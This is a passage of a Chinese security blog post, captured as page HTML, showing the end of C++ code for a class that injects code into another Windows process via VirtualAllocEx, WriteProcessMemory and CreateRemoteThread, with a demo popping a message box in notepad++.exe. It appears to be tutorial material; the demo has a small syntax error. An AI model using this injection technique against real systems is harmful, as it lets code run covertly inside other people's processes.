PAGE\_EXECUTE_READWRITE);</div><div class="line">		if (lpInjectPoint == NULL)</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T("VirtualAllocEx failedn"));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		//重定位NewMoudle代码</div><div class="line">		RelocCode(lpNewMoudle, lpInjectPoint);</div><div class="line"></div><div class="line">		//得到ThreadEntry在远程进程中的地址</div><div class="line">		LPTHREAD\_START\_ROUTINE lpRemoteEntryPoint;</div><div class="line">		LPBYTE lpParam;</div><div class="line">		lpRemoteEntryPoint = (LPTHREAD\_START\_ROUTINE)(lpInjectPoint + (DWORD)fnRemoteThread_Main - lpMoudle);</div><div class="line"></div><div class="line">		//将插入点地址作为参数传递给线程函数</div><div class="line">		lpParam = lpInjectPoint;</div><div class="line"></div><div class="line">		//将重定位好的代码通过WriteProcessMemory写入远程进程的内存空间中</div><div class="line">		if (!WriteProcessMemory(hRemoteProcess, lpInjectPoint, lpNewMoudle, dwImageSize, NULL))</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T("WriteProcessMemory failedn"));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		//通过CreateRemoteThread启动刚写入的代码，参数为Param</div><div class="line">		hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, 0, lpRemoteEntryPoint, lpParam, 0, NULL);</div><div class="line">		if (hRemoteThread == NULL)</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T("CreateRemoteThread failedn"));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		// 		//等待线程执行完成</div><div class="line">		// 		WaitForSingleObject(hRemoteThread, INFINITE);</div><div class="line">		// </div><div class="line">		// 		//获取完成</div><div class="line">		// 		DWORD dwExitCode;</div><div class="line">		// 		if (!GetExitCodeThread(hRemoteThread, &amp;dwExitCode))</div><div class="line">		// 		&#123;</div><div class="line">		// 			OutputDebugString(_T("GetExitCodeThread failedn"));</div><div class="line">		// 			bRet = FALSE;</div><div class="line">		// 			__leave;</div><div class="line">		//		&#125;</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">	__finally</div><div class="line">	&#123;</div><div class="line">		if (lpNewMoudle != NULL)</div><div class="line">		&#123;</div><div class="line">			VirtualFree(lpNewMoudle, 0, MEM_RELEASE);</div><div class="line">		&#125;</div><div class="line">		if (hRemoteProcess != NULL)</div><div class="line">		&#123;</div><div class="line">			CloseHandle(hRemoteProcess);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	return bRet;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//重载使用进程名</div><div class="line">BOOL CInjectCode::Inject(const wchar_t* wszProcessName)</div><div class="line">&#123;</div><div class="line">	DWORD dwProcID;</div><div class="line">	if (GetProcessIDByName(wszProcessName, dwProcID))</div><div class="line">	&#123;</div><div class="line">		return Inject(dwProcID);</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		OutputDebugString(_T("GetProcessIDByName failedn"));</div><div class="line">		return FALSE;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">附上使用demo</div><div class="line"></div><div class="line">#include "InjectCode.h"</div><div class="line"></div><div class="line">//远程要执行的代码，在这里只演示MessageBox</div><div class="line">DWORD RemoteThread_Main1(HINSTANCE hInstance)</div><div class="line">&#123;</div><div class="line">	::MessageBox(0, \_T("远程线程插入成功！"), \_T("远程线程"), 0);</div><div class="line">	return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">DWORD RemoteThread_Main2(HINSTANCE hInstance)</div><div class="line">&#123;</div><div class="line">	::MessageBox(0, \_T("远程线程插入成功！"), \_T("远程线程"), 0);</div><div class="line">	return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int \_tmain(int argc, \_TCHAR* argv\[\])</div><div class="line">&#123;</div><div class="line">	CInjectCode injectcode(RemoteThread_Main1);</div><div class="line">	if injectcode.Inject(L"notepad++.exe");</div><div class="line">	injectcode.SetRemoteThread\_Main(RemoteThread\_Main2);</div><div class="line">	injectcode.Inject(164);</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+            
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+        <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/writeups/2nd-360ctf-reverse5-writeup/"  data-tooltip="第二届360信息技术大赛逆向第五题writeup">
+                
+                    <i class="fa fa-angle-left"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/uncategorized/dll-injection/" data-tooltip="远程线程注入之DLL注入">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                    <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a class="post-action-btn btn btn--default btn-open-shareoptions"  href="#btn-open-shareoptions">
+                <i class="fa fa-share-alt"></i>
+            </a>
+        </li>
+        <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://blog.eadom.net/uncategorized/remote-thread-injection-without-dll/">
+                <i class="fa fa-google-plus"></i>
+            </a>
+        </li>
+        <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.eadom.net/uncategorized/remote-thread-injection-without-dll/">
+                <i class="fa fa-facebook-official"></i>
+            </a>
+        </li>
+        <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://blog.eadom.net/uncategorized/remote-thread-injection-without-dll/">
+                <i class="fa fa-twitter"></i>
+            </a>
+        </li>
+        
+            <li class="post-action">
+                <a class="post-action-btn btn btn--default" href="#disqus_thread">
+                    <i class="fa fa-comment-o"></i>
+                </a>
+            </li>
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#">
+            
+                <i class="fa fa-list"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+            
+                <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+            
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2019 Eadom. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="1">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/writeups/2nd-360ctf-reverse5-writeup/"  data-tooltip="第二届360信息技术大赛逆向第五题writeup">
+                
+                    <i class="fa fa-angle-left"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/uncategorized/dll-injection/" data-tooltip="远程线程注入之DLL注入">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                    <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a class="post-action-btn btn btn--default btn-open-shareoptions"  href="#btn-open-shareoptions">
+                <i class="fa fa-share-alt"></i>
+            </a>
+        </li>
+        <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://blog.eadom.net/uncategorized/remote-thread-injection-without-dll/">
+                <i class="fa fa-google-plus"></i>
+            </a>
+        </li>
+        <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.eadom.net/uncategorized/remote-thread-injection-without-dll/">
+                <i class="fa fa-facebook-official"></i>
+            </a>
+        </li>
+        <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://blog.eadom.net/uncategorized/remote-thread-injection-without-dll/">
+                <i class="fa fa-twitter"></i>
+            </a>
+        </li>
+        
+            <li class="post-action">
+                <a class="post-action-btn btn btn--default" href="#disqus_thread">
+                    <i class="fa fa-comment-o"></i>
+                </a>
+            </li>
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#">
+            
+                <i class="fa fa-list"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                <div id="share-options-bar" class="share-options-bar" data-behavior="1">
+    <ul class="share-options">
+        <li class="share-option">
+            <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https://blog.eadom.net/uncategorized/remote-thread-injection-without-dll/">
+                <i class="fa fa-google-plus"></i><span>Share on Google Plus</span>
+            </a>
+        </li>
+        <li class="share-option">
+            <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.eadom.net/uncategorized/remote-thread-injection-without-dll/">
+                <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
+            </a>
+        </li>
+        <li class="share-option">
+            <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https://blog.eadom.net/uncategorized/remote-thread-injection-without-dll/">
+                <i class="fa fa-twitter"></i><span>Share on Twitter</span>
+            </a>
+        </li>
+    </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+
+            
+        </div>
+        
+
+
+    
+        
+    
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-remove"></i>
+        </div>
+        
+            <img id="about-card-picture" src="/assets/images/avatar.jpg" alt="Author&#39;s picture"/>
+        
+            <h4 id="about-card-name">Eadom</h4>
+        
+            <div id="about-card-bio"><p>NO PWN NO FUN</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>@Alibaba</p>
+
+            </div>
+        
+        
+            <div id="about-card-location">
+                <i class="fa fa-map-marker"></i>
+                <br/>
+                Hangzhou
+            </div>
+        
+    </div>
+</div>
+
+        <div id="algolia-search-modal" class="modal-container">
+    <div class="modal">
+        <div class="modal-header">
+            <span class="close-button"><i class="fa fa-close"></i></span>
+            <a href="https://algolia.com" target="_blank" class="searchby-algolia text-color-light link-unstyled">
+                <span class="searchby-algolia-text text-color-light text-small">by</span>
+                <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
+            </a>
+            <i class="search-icon fa fa-search"></i>
+            <form id="algolia-search-form">
+                <input type="text" id="algolia-search-input" name="search"
+                    class="form-control input--large search-input" placeholder="Search "
+                    autofocus="autofocus"/>
+            </form>
+        </div>
+        <div class="modal-body">
+            <div class="no-result text-color-light text-center">no post found</div>
+            <div class="results">
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://blog.eadom.net/writeups/bctf2014-crypto100-writeup/">
+                            <h3 class="media-heading">BCTF2014线上赛crypto100混沌密码锁writeup</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Apr 2, 2014
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://blog.eadom.net/writeups/bctf2014-crypto300-writeup/">
+                            <h3 class="media-heading">BCTF2014线上赛crypto300比特币钱包writeup</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Apr 2, 2014
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://blog.eadom.net/writeups/bctf2014-crypto400-writeup/">
+                            <h3 class="media-heading">BCTF2014线上赛crypto400地铁难挤writeup</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Apr 2, 2014
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://blog.eadom.net/uncategorized/lianliankan-cheater/">
+                            <h3 class="media-heading">连连看外挂——人生真是寂寞如雪啊</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Apr 2, 2014
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://blog.eadom.net/uncategorized/rjsupplicant-for-linux/">
+                            <h3 class="media-heading">rjsupplicant for linux 锐捷代理破除多网卡限制</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Apr 3, 2014
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://blog.eadom.net/uncategorized/process-monoalphabetic-substitution-cipher/">
+                            <h3 class="media-heading">辅助处理单表替换密码</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Apr 6, 2014
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://blog.eadom.net/writeups/actf2014-crypto100-writerup/">
+                            <h3 class="media-heading">ACTF2014之crypto100古老writerup</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Apr 7, 2014
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://blog.eadom.net/writeups/actf2014-crypto200-writerup/">
+                            <h3 class="media-heading">ACTF2014之crypto200买不到票的怨念writerup</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Apr 7, 2014
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://blog.eadom.net/uncategorized/dll-injection/">
+                            <h3 class="media-heading">远程线程注入之DLL注入</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jun 19, 2014
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://blog.eadom.net/uncategorized/remote-thread-injection-without-dll/">
+                            <h3 class="media-heading">不注入DLL实现远程线程注入</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jun 25, 2014
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+            </div>
+        </div>
+        <div class="modal-footer">
+            <p class="results-count text-medium"
+                data-message-zero="no post found"
+                data-message-one="1 post found"
+                data-message-other="{n} posts found">
+                19 posts found
+            </p>
+        </div>
+    </div>
+</div>
+        
+<div id="cover" style="background-image:url('/assets/images/cover.png');"></div>
+        <!--SCRIPTS-->
+<script src="/assets/js/script-rt08quwts7iav5x0cfd2ym0gb5qkd1lvrsmwrakxtkhefmaaes4ywkmnjnwf.min.js"></script>
+<!--SCRIPTS END-->
+
+    
+        <script>
+             var disqus_config = function () {
+                 this.page.url = 'https://blog.eadom.net/uncategorized/remote-thread-injection-without-dll/';
+                 
+                    this.page.identifier = 'uncategorized/remote-thread-injection-without-dll/';
+                 
+             };
+            (function() {
+                var d = document, s = d.createElement('script');
+                var disqus_shortname = 'eadomblog';
+                s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+                s.setAttribute('data-timestamp', +new Date());
+                (d.head || d.body).appendChild(s);
+            })();
+        </script>
+    
+
+
+
+    </body>
+</html>
